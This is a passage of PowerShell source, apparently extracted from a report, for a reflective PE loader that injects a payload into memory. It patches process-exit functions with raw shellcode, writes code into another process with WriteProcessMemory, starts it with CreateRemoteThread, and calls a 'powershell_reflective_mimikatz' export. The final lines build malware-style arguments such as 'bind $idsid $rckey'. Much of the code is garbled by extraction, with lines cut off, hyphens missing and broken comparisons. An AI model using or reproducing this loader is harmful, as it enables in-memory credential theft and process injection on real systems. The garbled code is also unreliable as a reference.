$false)\n{\nthrow \"Call to VirtualProtect failed\"\n}\n$GetCommandLineAAddrTemp = $GetCommandLineAAddr\nWrite-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp\n$GetCommandLineAAddrTemp = Add\n```\n\n-----\n\n```\nSignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommand\n$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize\nWrite-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp\n$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt3\nNull\n[UInt32]$OldProtectFlag = 0\n$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalS\n($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)\nif ($Success = $false)\n{\nthrow \"Call to VirtualProtect failed\"\n}\n$GetCommandLineWAddrTemp = $GetCommandLineWAddr\nWrite-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp\n$GetCommandLineWAddrTemp = AddSignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommand\n$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize\nWrite-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp\n$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt3\nNull\n$DllList = @(\"msvcr70d.dll\", \"msvcr71d.dll\", \"msvcr80d.dll\", \"msvcr90d.dll\", \"msvcr100\n, \"msvcr71.dll\", \"msvcr80.dll\", \"msvcr90.dll\", \"msvcr100.dll\", \"msvcr110.dll\")\nforeach ($Dll in $DllList)\n{\n[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)\nif ($DllHandle -ne [IntPtr]::Zero)\n{\n[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, \"_wcmdln\")\n[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, \"_acmdln\")\nif ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)\n{\n\"Error, couldn't find _wcmdln or _acmdln\"\n}\n$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArgu\n$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgum\n$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr,\n[IntPtr])\n$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr,\n[IntPtr])\n$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSiz\n$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSiz\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPt\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPt\n$ReturnArray +=,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)\n\n```\n\n-----\n\n```\n$ReturnArray +,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)\n$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt3\n($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)\nif ($Success = $false)\n{\nthrow \"Call to VirtualProtect failed\"\n}\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $\n$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]\n($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null\n$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt3\n($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)\nif ($Success = $false)\n{\nthrow \"Call to VirtualProtect failed\"\n}\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $\n$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]\n($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null\n}\n}\n$ReturnArray = @()\n$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the p\n[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke(\"mscoree.dll\")\nif ($MscoreeHandle -eq [IntPtr]::Zero)\n{\nthrow \"mscoree handle null\"\n}\n[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, \"C\nif ($CorExitProcessAddr -eq [IntPtr]::Zero)\n{\nThrow \"CorExitProcess address not found\"\n}\n$ExitFunctions += $CorExitProcessAddr\n[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, \"Exi\nif ($ExitProcessAddr -eq [IntPtr]::Zero)\n{\nThrow \"ExitProcess address not found\"\n}\n$ExitFunctions += $ExitProcessAddr\n[UInt32]$OldProtectFlag = 0\nforeach ($ProcExitFunctionAddr in $ExitFunctions)\n{\n$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr\n[Byte[]]$Shellcode1 = @(0xbb)\n[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)\nif ($PtrSize -eq 8)\n{\n[Byte[]]$Shellcode1 = @(0x48, 0xbb)\n[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0x\n\n```\n\n-----\n\n```\n}\n[Byte[]]$Shellcode3 = @(0xff, 0xd3)\n$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcod\n[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, \"Exit\nif ($ExitThreadAddr -eq [IntPtr]::Zero)\n{\nThrow \"ExitThread address not found\"\n}\n$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$Total\nif ($Success -eq $false)\n{\nThrow \"Call to VirtualProtect failed\"\n}\n$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Tot\n$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64\nNull\n$ReturnArray +=,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)\nWrite-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp\n$ProcExitFunctionAddrTmp = AddSignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFun\n$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize\nWrite-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp\n$ProcExitFunctionAddrTmp = AddSignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFun\n$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize\nWrite-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp\n$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt\nNull\n}\nWrite-Output $ReturnArray\n}\nFunction Copy-ArrayOfMemAddresses\n{\nParam(\n[Parameter(Position = 0, Mandatory = $true)]\n[Array[]]\n$CopyInfo,\n[Parameter(Position = 1, Mandatory = $true)]\n[System.Object]\n$Win32Functions,\n[Parameter(Position = 2, Mandatory = $true)]\n[System.Object]\n$Win32Constants\n)\n[UInt32]$OldProtectFlag = 0\nforeach ($Info in $CopyInfo)\n\n```\n\n-----\n\n```\n{\n$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$\nif ($Success -eq $false)\n{\nThrow \"Call to VirtualProtect failed\"\n}\n$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null\n$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectF\nNull\n}\n}\nFunction Get-MemoryProcAddress\n{\nParam(\n[Parameter(Position = 0, Mandatory = $true)]\n[IntPtr]\n$PEHandle,\n[Parameter(Position = 1, Mandatory = $true)]\n[String]\n$FunctionName\n)\n$Win32Types = Get-Win32Types\n$Win32Constants = Get-Win32Constants\n$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types Win32Constants $Win32Constants\nif ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)\n{\nreturn [IntPtr]::Zero\n}\n$ExportTablePtr = AddSignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.V\n$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePt\nfor ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)\n{\n$NameOffsetPtr = AddSignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.I\n[UInt32])))\n$NamePtr = AddSignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStruct\n[UInt32]))\n$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)\nif ($Name -ceq $FunctionName)\n{\n$OrdinalPtr = AddSignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Ru\n[UInt16])))\n$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Ty\n[UInt16])\n$FuncOffsetAddr = AddSignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [Syst\n[UInt32])))\n$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr\n\n```\n\n-----\n\n```\n[UInt32])\nreturn Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)\n}\n}\nreturn [IntPtr]::Zero\n}\nFunction Invoke-MemoryLoadLibrary\n{\nParam(\n[Parameter( Position = 0, Mandatory = $true )]\n[Byte[]]\n$PEBytes,\n[Parameter(Position = 1, Mandatory = $false)]\n[String]\n$ExeArgs,\n[Parameter(Position = 2, Mandatory = $false)]\n[IntPtr]\n$RemoteProcHandle\n)\n$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])\n$Win32Constants = Get-Win32Constants\n$Win32Functions = Get-Win32Functions\n$Win32Types = Get-Win32Types\n$RemoteLoading = $false\nif (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))\n{\n$RemoteLoading = $true\n}\n$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types\n$OriginalImageBase = $PEInfo.OriginalImageBase\n$NXCompatible = $true\nif (([Int] $PEInfo.DllCharacteristics band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)\n{\nWrite-Warning \"PE is not compatible with DEP, might cause issues\" WarningAction Continue\n$NXCompatible = $false\n}\n$Process64Bit = $true\nif ($RemoteLoading -eq $true)\n{\n$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(\"kernel32.dll\")\n$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, \"IsWow64Process\")\nif ($Result -eq [IntPtr]::Zero)\n{\nThrow \"Couldn't locate IsWow64Process function to determine if target process is 32bit\n}\n[Bool]$Wow64Process = $false\n$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process\nif ($Success -eq $false)\n{\nThrow \"Call to IsWow64Process failed\"\n\n```\n\n-----\n\n```\n}\nif (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))\n{\n$Process64Bit = $false\n}\n$PowerShell64Bit = $true\nif ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)\n{\n$PowerShell64Bit = $false\n}\nif ($PowerShell64Bit -ne $Process64Bit)\n{\nthrow \"PowerShell must be same architecture (x86/x64) as PE being loaded and remote pr\n}\n}\nelse\n{\nif ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)\n{\n$Process64Bit = $false\n}\n}\nif ($Process64Bit -ne $PEInfo.PE64Bit)\n{\nThrow \"PE platform doesn't match the architecture of the process it is being loaded in\n}\n[IntPtr]$LoadAddr = [IntPtr]::Zero\nif (([Int] $PEInfo.DllCharacteristics band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)\n{\nWriteWarning \"PE file being reflectively loaded is not ASLR compatible. If the loading fail\nWarningAction Continue\n[IntPtr]$LoadAddr = $OriginalImageBase\n}\n$PEHandle = [IntPtr]::Zero #This is where the PE is allocated in PowerShell\n$EffectivePEHandle = [IntPtr]::Zero\n#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equ\nif ($RemoteLoading -eq $true)\n{\n$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeO\nbor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)\n$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAdd\nbor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)\nif ($EffectivePEHandle -eq [IntPtr]::Zero)\n{\nThrow \"Unable to allocate memory in the remote process. If the PE being loaded doesn't\n}\n}\n\n```\n\n-----\n\n```\nelse\n{\nif ($NXCompatible -eq $true)\n{\n$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImag\nbor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)\n}\nelse\n{\n$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImag\nbor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)\n}\n$EffectivePEHandle = $PEHandle\n}\n[IntPtr]$PEEndAddress = AddSignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)\nif ($PEHandle -eq [IntPtr]::Zero)\n{\nThrow \"VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, tr\n}\n[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfH\nNull\n$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types Win32Constants $Win32Constants\n$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress\n$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle Value $EffectivePEHandle\nCopy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions Win32Types $Win32Types\nUpdate-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase Win32Constants $Win32Constants -Win32Types $Win32Types\nif ($RemoteLoading -eq $true)\n{\nImport-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions Win32Types $Win32Types -Win32Constants $Win32Constants RemoteProcHandle $RemoteProcHandle\n}\nelse\n{\nImport-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions Win32Types $Win32Types -Win32Constants $Win32Constants\n}\nif ($RemoteLoading -eq $false)\n{\nif ($NXCompatible -eq $true)\n{\nUpdate-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions Win32Constants $Win32Constants -Win32Types $Win32Types\n}\nelse\n{\n}\n}\nelse\n\n```\n\n-----\n\n```\n{\n}\nif ($RemoteLoading -eq $true)\n{\n[UInt32]$NumBytesWritten = 0\n$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHa\n($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)\nif ($Success -eq $false)\n{\nThrow \"Unable to write shellcode to remote process memory.\"\n}\n}\nif ($PEInfo.FileType -ieq \"DLL\")\n{\nif ($RemoteLoading -eq $false)\n{\n$DllMainPtr = AddSignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.Addres\n$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])\n$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($Dl\n$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null\n}\nelse\n{\n$DllMainPtr = AddSignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.Addr\nif ($PEInfo.PE64Bit -eq $true)\n{\n$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)\n$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00,\n$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)\n}\nelse\n{\n$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)\n$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50,\n$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)\n}\n$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length +\n$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)\n$SCPSMemOriginal = $SCPSMem\nWrite-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem,\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)\nWrite-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false\n\n```\n\n-----\n\n```\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)\nWrite-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)\n$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [U\n[UInt64]$SCLength, $Win32Constants.MEM_COMMIT bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)\nif ($RSCAddr -eq [IntPtr]::Zero)\n{\nThrow \"Unable to allocate memory in the remote process for shellcode\"\n}\n$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCP\n[UInt64]$SCLength, [Ref]$NumBytesWritten)\nif (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))\n{\nThrow \"Unable to write shellcode to remote process memory.\"\n}\n$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle StartAddress $RSCAddr -Win32Functions $Win32Functions\n$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)\nif ($Result -ne 0)\n{\nThrow \"Call to CreateRemoteThread to call GetProcAddress failed.\"\n}\n$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr]\n[UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null\n}\n}\nelseif ($PEInfo.FileType -ieq \"EXE\")\n{\n[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)\n[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)\n$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo Win32Functions $Win32Functions -Win32Constants $Win32Constants ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr\n[IntPtr]$ExeMainPtr = AddSignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.Addres\n$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntP\n([UInt32]0)) | Out-Null\nwhile($true)\n{\n[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr\nif ($ThreadDone -eq 1)\n{\nCopy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo Win32Functions $Win32Functions -Win32Constants $Win32Constants\nbreak\n}\nelse\n{\nStart-Sleep -Seconds 1\n}\n}\n\n```\n\n-----\n\n```\n}\nreturn @($PEInfo.PEHandle, $EffectivePEHandle)\n}\nFunction Invoke-MemoryFreeLibrary\n{\nParam(\n[Parameter(Position=0, Mandatory=$true)]\n[IntPtr]\n$PEHandle\n)\n$Win32Constants = Get-Win32Constants\n$Win32Functions = Get-Win32Functions\n$Win32Types = Get-Win32Types\n$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types Win32Constants $Win32Constants\nif ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)\n{\n[IntPtr]$ImportDescriptorPtr = AddSignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.Optiona\nwhile ($true)\n{\n$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDe\nif ($ImportDescriptor.Characteristics -eq 0 `\n-and $ImportDescriptor.FirstThunk -eq 0 `\n-and $ImportDescriptor.ForwarderChain -eq 0 `\n-and $ImportDescriptor.Name -eq 0 `\n-and $ImportDescriptor.TimeDateStamp -eq 0)\n{\nbreak\n}\n$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((AddSignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))\n$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)\nif ($ImportDllHandle -eq $null)\n{\nWriteWarning \"Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Conti\nWarningAction Continue\n}\n$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)\nif ($Success -eq $false)\n{\nWrite-Warning \"Unable to free library: $ImportDllPath. Continuing anyways.\" WarningAction Continue\n}\n$ImportDescriptorPtr = AddSignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::\n}\n}\n$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.ME\nif ($Success -eq $false)\n\n```\n\n-----\n\n```\n{\nWrite-Warning \"Unable to call VirtualFree on the PE's memory. Continuing anyways.\" WarningAction Continue\n}\n}\nFunction Main\n{\n$Win32Functions = Get-Win32Functions\n$Win32Types = Get-Win32Types\n$Win32Constants = Get-Win32Constants\n$RemoteProcHandle = [IntPtr]::Zero\nif (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) and ($ProcName -ne \"\"))\n{\nThrow \"Can't supply a ProcId and ProcName, choose one or the other\"\n}\nelseif ($ProcName -ne $null -and $ProcName -ne \"\")\n{\n$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)\nif ($Processes.Count -eq 0)\n{\nThrow \"Can't find process $ProcName\"\n}\nelseif ($Processes.Count -gt 1)\n{\n$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | SelectObject ProcessName, Id, SessionId\nWrite-Output $ProcInfo\nThrow \"More than one instance of $ProcName found, please specify the process ID to inj\n}\nelse\n{\n$ProcId = $Processes[0].ID\n}\n}\nif (($ProcId -ne $null) -and ($ProcId -ne 0))\n{\n$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)\nif ($RemoteProcHandle -eq [IntPtr]::Zero)\n{\nThrow \"Couldn't obtain the handle for process ID: $ProcId\"\n}\n}\n    try\n    {\n      $Processors = Get-WmiObject -Class Win32_Processor\n    }\n    catch\n    {\n      throw ($_.Exception)\n    }\n    if ($Processors -is [array])\n    {\n      $Processor = $Processors[0]\n\n```\n\n-----\n\n```\n    } else {\n      $Processor = $Processors\n    }\n    if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )\n    {\n      WriteError \"PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS m\nErrorAction Stop\n    }\n    if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)\n    {\n      [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)\n    }\n    else\n    {\n      [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)\n    }\n    $PEBytes[0] = 0\n    $PEBytes[1] = 0\n$PEHandle = [IntPtr]::Zero\nif ($RemoteProcHandle -eq [IntPtr]::Zero)\n{\n$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs\n}\nelse\n{\n$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs RemoteProcHandle $RemoteProcHandle\n}\nif ($PELoadedInfo -eq [IntPtr]::Zero)\n{\nThrow \"Unable to load PE, handle returned is NULL\"\n}\n$PEHandle = $PELoadedInfo[0]\n$RemotePEHandle = $PELoadedInfo[1]\n$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types Win32Constants $Win32Constants\nif (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -eq [IntPtr]::Zero))\n{\n  [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle FunctionName \"powershell_reflective_mimikatz\"\n  if ($WStringFuncAddr -eq [IntPtr]::Zero)\n  {\n  Throw \"Couldn't find function address.\"\n  }\n  $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])\n  $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoi\n          $WStringInput = [System.Runtime.InteropServices.Marshal]::StringTo\n  [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)\n          [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInpu\n  if ($OutputPtr -eq [IntPtr]::Zero)\n  {\n\n```\n\n-----\n\n```\n   Throw Unable to get output, Output Ptr is NULL \n  }\n  else\n  {\n    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)\n    Write-Output $Output\n    $Win32Functions.LocalFree.Invoke($OutputPtr);\n  }\n}\nelseif (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -ne [IntPtr]::Zero))\n{\n$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"VoidFunc\"\nif (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))\n{\nThrow \"VoidFunc couldn't be found in the DLL\"\n}\n$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle\n$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle\n$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle StartAddress $VoidFuncAddr -Win32Functions $Win32Functions\n}\nif ($RemoteProcHandle -eq [IntPtr]::Zero)\n{\nInvoke-MemoryFreeLibrary -PEHandle $PEHandle\n}\nelse\n{\n$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.ME\nif ($Success -eq $false)\n{\nWrite-Warning \"Unable to call VirtualFree on the PE's memory. Continuing anyways.\" WarningAction Continue\n}\n}\n}\nMain\n}\nFunction Main\n{\nif (($PSCmdlet.MyInvocation.BoundParameters[\"Debug\"] -ne $null) and $PSCmdlet.MyInvocation.BoundParameters[\"Debug\"].IsPresent)\n{\n$DebugPreference = \"Continue\"\n}\n$ExeArgs = \"\"\nif ($versid -eq \"bind\")\n{\n$ExeArgs = \"notepad.exe bind $idsid $rckey\"\n}\nelseif ($versid -eq \"atinmem\")\n {\n$ExeArgs = \"notepad.exe $fpath $idsid 